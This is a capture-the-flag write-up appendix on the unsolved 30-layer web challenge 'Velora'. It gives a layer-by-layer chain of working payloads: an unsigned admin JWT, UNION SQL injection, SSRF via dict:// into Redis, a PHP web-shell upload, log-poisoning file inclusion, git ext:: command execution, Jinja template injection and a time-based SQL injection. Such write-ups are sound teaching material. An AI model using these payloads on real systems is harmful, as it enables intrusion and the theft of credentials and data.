# CSCTF 2026 — Velora (9125): near miss, not a solve

**Not part of the official writeup.** The submission template allows cards only for
challenges the team solved. Velora was walked to layer 29 of 30 and never submitted,
so it is kept here as an appendix instead.

- Challenge: Velora (id 9125), Web, Hard, 900 points
- Result: no flag submitted; 29 of 30 layers demonstrated with request/response pairs
- Owner: velora lane

---

## Velora — the one that killed us up

Web · Hard · 900 points · 30 layers

**Tools used:** one `requests.Session` per walk and two scripts — `walk.py` for L1–L20, `l21_29.py` for L21–L29 — with every gate response saved to disk. No scanner: the chain is order-sensitive, and each layer had to be earned before the next one would answer.

**tl;dr.** Thirty strictly ordered layers, each one answering only when `X-Chain` replays every proof the earlier layers handed back — and from L4 on, the plane also checks that the earlier step genuinely fired. We walked twenty-nine of them live: from a per-session HTML comment on the landing page to a settled ledger entry, through an unsigned admin JWT, a UNION into a table that is in no schema we had seen, a `dict://` pivot into Redis, a persisted-operation GraphQL gate, and a hundred thousand OTP codes in one document. The thirtieth gate returned one sentence: `{"ok": false, "layer": 30, "error": "The navigator has not recorded a delay."}` One layer from the flag. We did not solve Velora and we are not going to dress that up — but twenty-nine layers, each with a request and a byte-exact response, is the part we did win.

### The walk

Every request below runs in the same session. `X-Chain` always carries every proof so far, joined with `|`; the chain is session-bound and its length is fixed, so a missing or an extra segment answers `404`, not a hint.

1. **L1 — the channel token.** `GET /` carries `<!-- channel:/x/<hex> -->`. The token is minted per session, so sign up first (`POST /signup`, `plan=enterprise`), then read it in that same session. `GET /x/<token>` → `{"layer":1,"proof":"<p1>","note":"Bootstrap accepted. Crawler rules ship with the site."}`

2. **L2 — the crawl map.** `GET /robots.txt` → `# budget:/x/<hex>`. `GET /x/<token>` with `X-Chain: <p1>` → layer 2, "Crawl map accepted. The console bundle ships with every page."

3. **L3 — the bundle.** `GET /static/app.js` → `// map:/x/<hex>`. `X-Chain: p1|p2` → layer 3, "Bundle accepted," plus a `next`.

4. **L4 — the plan.** Gate with `X-Chain: p1|p2|p3` fires only if the workspace is on `plan=enterprise`, which is a signup field and not a page: without it the gate answers "This workspace is not on a plan that includes operator tools." With it, "Plan updated."

5. **L5 — the member record.** The gate says "Operator member settings have not been read." `GET /api/members/<uuid>/settings` — the UUID is in the JSON-LD on `/company` — then the gate again → "Member settings recovered."

6. **L6 — the design-review tenant.** Gate: "This is not the design-review tenant session." `/login` carries two XOR masks, `data-cfemail` and `data-review`, that decode to the preview account and its passphrase. Log in as preview, then `POST /signup` with the same email and `plan=enterprise`; the in-session signup upgrades that workspace instead of creating a new user. Gate → "Design-review session confirmed," and `next` points at L7.

7. **L7 — the unsigned admin.** Five lanes had already killed HS256 cracking (14.3M rockyou candidates, 88k themed words, every key-shaped public string), `kid`/`jku` injection and the whole header-and-param surface. The way through is not forgery but the absence of it: keep the walked session's `sid`, replace only `velora_session` with `base64url({"alg":"none","typ":"JWT"}) + "." + base64url(<payload with "role":"admin">) + "."` — an empty signature — and call the gate. `{"ok":true,"layer":7,"note":"Console is open."}` Note the vocabulary gap: the message says *operator*, the accepted claim is `admin`.

8. **L8 — the partner export.** `GET /api/v1/export/1001`, the legacy partner ticket (5001–5003 are the workspace's own). Gate → "Partner export recovered."

9. **L9 — the hidden table.** `/catalog` is an operator tool and opens with L7. Its search "hits the embedded store directly", seven columns wide, column 2 rendered as the bold name: `GET /catalog?q=zzz' UNION SELECT id,name,detail,'x','x','x','x' FROM fabric_routes--`. The table is in no schema we had seen, and it returns the four rows that drive the next four layers: `preview → /api/preview`, `host → [redacted-host]`, `ports → 80 6379 9200`, `links → X-Forwarded-Host`. Gate → "Fabric map recovered."

10. **L10 — the host override.** Send the internal hostname to the edge: `X-Forwarded-Host: [redacted-host]` on the gate. → "Host override stored."

11. **L11 — the fabric index.** `GET /api/preview?url=http://[redacted-host]/` with the same header → `<h1>Fabric index</h1><ul><li>edge :80</li><li>cache :6379</li><li>settle :9200</li></ul>`. Gate → "Fabric index retrieved."

12. **L12 — the alternate origin.** The gate first answers "An alternate origin has not been fetched." The preview filter drops literal private addresses but not short forms, so `GET /api/preview?url=http://127.1/` returns the same index from loopback. Gate → "Alternate origin answered."

13. **L13 — the cache port.** `GET /api/preview?url=http://127.1:6379/` → `{"error":"upstream is not HTTP","banner":"-ERR unknown command"}`. Gate → "Cache port answered."

14. **L14 — the keyspace.** The preview worker speaks more than HTTP: `GET /api/preview?url=dict://127.1:6379/KEYS` → `['operator.session', 'queue.settle', 'lock.nav', 'cache.catalog']`. Gate → "Keyspace listed."

15. **L15 — the operator session.** `dict://127.1:6379/GET operator.session` → `op_<24 hex>`. Gate → "Session value stored."

16. **L16 — the cookie.** Replay the value as `Cookie: operator=op_<24 hex>`. Gate → "Operator restored."

17. **L17 — the persisted operation.** `/api/graphql` only accepts persisted operations by hash, but it hashes the text you inline and compares it with the `sha256Hash` you declare — so a self-hashed document passes the hash gate, and the operation name is then checked against what the server ships. `POST /api/graphql` with `{"query":"query { health }","extensions":{"persistedQuery":{"version":1,"sha256Hash":<sha256 of that exact text>}}}` → `{"data":{"health":"ok"}}`. Gate → "Health operation accepted."

18. **L18 — the ledger keys.** The same trick with `{ accounts { holder internalLedgerKey } }` → three holders with their `internalLedgerKey` values (redacted). Gate → "Ledger operation accepted."

19. **L19 — the 100,000-code step-up.** Ticket 1001 says the codes are five digits and "the attempt counter is kept once per request." So one request carries the whole space as aliases: `mutation { a0: verifyOtp(code:"00000"){ok} … a99999: verifyOtp(code:"99999"){ok} }`, self-hashed. → `{"data":{"verifyOtp":{"ok":true,"session":"otp_ok"}},"checked":100000}`. Gate → "Step-up complete."

20. **L20 — the dashboard.** `GET /dashboard` now serves the Operations page (`page=dashboard-pages/home.html` is its own form default) instead of the step-up 403. Gate → "Dashboard template loaded."

21. **L21 — the schema, through the page primitive.** `?doc=` requires a literal `library/` prefix, so the brief's `../../secret/schema.txt` dies on the doc primitive. `?page=` has no such prefix: `GET /dashboard?page=dashboard-pages/../../secret/schema.txt` → 244 bytes — `config(name, value)`, `nav(link, label)`, a note that `settlement_record` is inserted into `config` by the settlement job, the access-log path, and `/entrypoint.sh`. Gate → "Schema recovered."

22. **L22 — the handler map.** `GET /library?doc=library/../../../../etc/apache2/mods-enabled/php.conf` → 195 bytes: `AddHandler application/x-httpd-php .php`, then the two lines that make L23 work — handler tokens are matched *inside* the filename, not only as the final extension, and `/support` stores the original client filename under `/uploads/`. Gate → "Handler map recovered."

23. **L23 — the desk shell.** `POST /support` multipart, `filename="shell.pHp.jpg"`, body `GIF89a<?php system($_GET["c"]); ?>`; then `GET /uploads/shell.pHp.jpg?c=id` → `uid=48(desk)`. Lowercase `.php.jpg` is served raw; the mixed case is what the handler matches. Gate → "Desk account confirmed."

24. **L24 — the web account.** Poison the access log with a User-Agent carrying the same payload, then include the log through the page primitive: `GET /dashboard?page=dashboard-pages/../../../../../var/log/apache2/access.log&c=id` → `uid=33(www-data)`. Gate → "Web account confirmed."

25. **L25 — the service account.** Same include with `c=cat /entrypoint.sh` → `RECON_USER=svc.settle`. Gate → "Service account name recovered."

26. **L26 — the settlement secret.** Back to the desk shell: `GET /uploads/<shell>?c=cat /opt/velora/reconcile.env` → `RECON_PASS=[redacted]`. Gate → "Settlement secret recovered."

27. **L27 — the nightly job.** `/import` executes git's `ext::` transport: `POST /import` with `repo_url=ext::sh -c cat$IFS/opt/velora/nightly.sh>&2` → the job script, whose payload line is `curl -s -u "$RECON_USER:$RECON_PASS" http://127.0.0.1:9200/ledger/reconcile`. Gate → "Job script recovered."

28. **L28 — the release note.** `/request-demo` renders the visitor name through Jinja: `name={{lipsum.__globals__['os'].popen('cat /root/velora/release.note').read()}}` → the note. It says `settlement_record` is written into `config` only after reconcile succeeds, and gives the navigator query `SELECT link, label FROM nav WHERE role = '<role>' ORDER BY sort` — plus the sentence that becomes L30. Gate → "Release note recovered."

29. **L29 — the reconcile.** The preview worker will carry credentials to a loopback URL: `GET /api/preview?url=http://svc.settle:<RECON_PASS>@127.1:9200/ledger/reconcile` → `{"release_code":"<redacted>","status":"reconciled","note":"config updated"}`. Gate → "Settlement reconciled." `next` hands back the thirtieth token.

### L30 — the wall

The gate is one sentence, and it is the whole specification we had:

```
{"ok": false, "layer": 30, "error": "The navigator has not recorded a delay."}
```

The only artifact that describes a navigator is the release note from L28. Three facts in it matter:

- the query is `SELECT link, label FROM nav WHERE role = '<role>' ORDER BY sort`;
- the wrapper appends the sort clause;
- "A timing probe is recorded only after that clause is no longer part of the statement."

Read together, that is a legible payload shape even without the endpoint. `role` is interpolated inside a quoted string and `sort` is appended by the wrapper, so a role value that closes the quote, injects a delay and comments out the appended clause turns the nav render into a timing probe — the same recursive-CTE burn we carried everywhere else:

```
role=x' AND 1=(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000) SELECT x FROM c))--
```

What we could not find is anything that runs it.

**What we tried.**

- **Role and sort carriers.** Seventeen role-ish and fourteen sort-ish parameter names across `/`, `/desk`, `/dashboard`, `/library`, `/console`, `/company`, `/catalog`, `/admin`, `/uploads`, `/support`, `/import` and `/status`; GET query and POST JSON; the same names as JWT claims (`role`, `name`, `sub`, `iss`, `unit`, `plan`, `tier`) and as signup mass-assignment. Every answer was the untouched page or the untouched gate, and every timing was flat within noise.
- **A method-first route oracle over 1,341 paths.** ~110 challenge words × 9 prefixes, GET and POST each, filtering only the two known 404 shapes (22-byte JSON, 1,693-byte HTML). It found the four gates we already knew and nothing else; nested guesses under `/api/`, `/console/`, `/dashboard/` and `/x/` added nothing.
- **Slow preview targets.** Non-routable hosts and slow paths through `/api/preview` return `504 {"error":"egress timed out"}` in ~0.28 s. That is a timeout, not a delay, and the gate never reads it.
- **The settle service directly.** `POST /ledger/reconcile` with and without the service credentials, plus `/nav`, `/navigator`, `/navigation`, `/ledger/*` and ES-style `/_search` → 404 or the same stub. `:9200` answers exactly one route, and it is L29's.
- **Both include jails, ~74,000 path probes.** `/library?doc=` and `/dashboard?page=` for a nav renderer, a template, or any application source. Both jails resolve to a handful of curated objects — `/etc/passwd`, `php.conf` and a welcome page behind the first; the schema and the access log behind the second. No source, no route table, no navigator.
- **Redis.** `lock.nav` is in the keyspace and reads `null`. The `dict://` transport is GET-only from the preview worker, so there is no write path from where we stood.

**Why we stopped.** Not for lack of guesses. The mock is authored, not implemented: the upload shell is a regex that fakes `system()`, the import shell is the same emulator, the GraphQL endpoint is a hash check plus a fixed operation list, and both include jails are dictionaries. Every route that exists is named somewhere in an artifact. The navigator is named only in the release note, and no reachable surface implements it — not the web app, not `:6379`, not `:9200`, not `:80`. At close the container was gone, so a fresh differential pass was no longer possible either. We are calling it at 29.

### What we would do with one more hour

- **Derive the route instead of fuzzing it.** `schema.txt` names exactly two tables — `config(name, value)` and `nav(link, label)` — and the dashboard's own form names its template namespace (`dashboard-pages/*`). One hour of reading that namespace and the handler map, with the 1,341-path oracle used as confirmation rather than discovery, is worth more than another 74,000 guesses: if the navigator is a page it is under `dashboard-pages/`, and if it is a handler, `php.conf` is where its naming rule lives.
- **Make the delay a state change, not a duration.** `lock.nav` exists in the keyspace, which means something writes it. Read `lock.nav` before and after every L29 variant — a different release code, a repeated reconcile, a second reconcile with the credentials omitted — and diff. If it flips, the navigator is downstream of settle and the "delay" is a side effect of the reconcile, not of a SQL query at all.
- **Instrument one clean pass end to end.** One script, L1–L29, logging every response header, `Set-Cookie`, gate `note` and millisecond timing. The brief says the plane checks from L4 that earlier steps *genuinely fired*; if L30 wants a delay recorded earlier in the walk, a single ordered timeline is the only artifact that shows where it should have been written.

### Lessons

- **Record negatives per layer.** Every "not this" here carries its request and byte-exact response — 14.3M rockyou candidates, 1,341 routes, 74,000 include probes, six lanes of dead surfaces. The ledger is why the walk took one session instead of thirty: nobody repeated a falsified idea, and every new gate message could be compared against a known-good baseline.
- **A gate message is a spec.** "Operator role was not accepted" did not mean the token had to be signed, and it did not mean the role had to be called `operator`; the accepted claim was `admin` in an unsigned token. "The navigator has not recorded a delay" is the same kind of sentence — it names a *recorded* fact, not a slow response. Read it literally and the search space shrinks; read it as a vibe and you spend an hour timing `504`s.
- **The mock surfaces are authored, so unlisted routes cannot be guessed — only derived.** Every layer that opened was named by an artifact: a comment in `/`, a line in `robots.txt`, a token in `app.js`, a UUID in JSON-LD, a table in a SQL result, a key in Redis, a path in `php.conf`, a query in a release note. The 1,341-path oracle found zero new routes because there were zero to find. Wordlists confirm absence; artifacts create presence.
